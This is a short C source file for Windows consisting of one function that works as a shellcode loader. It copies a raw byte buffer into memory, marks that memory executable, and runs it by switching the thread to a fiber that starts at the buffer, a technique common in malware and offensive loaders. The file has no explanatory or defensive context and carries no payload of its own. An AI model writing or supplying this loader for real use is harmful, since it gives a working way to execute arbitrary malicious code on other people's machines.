#include <windows.h>

void ExecSC(const unsigned char* shellcode, size_t length) {
    LPVOID allocmem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocmem == NULL) {
        ExitProcess(GetLastError());
    }
    memcpy(allocmem, shellcode, length);
    DWORD oldProtect;
    if (!VirtualProtect(allocmem, length, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(allocmem, 0, MEM_RELEASE);
        ExitProcess(GetLastError());
    }
    HANDLE fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)allocmem, NULL);
    if (fiber == NULL) {
        VirtualFree(allocmem, 0, MEM_RELEASE);
        ExitProcess(GetLastError());
    }
    ConvertThreadToFiber(NULL);
    SwitchToFiber(fiber);
    DeleteFiber(fiber);
    VirtualFree(allocmem, 0, MEM_RELEASE);
}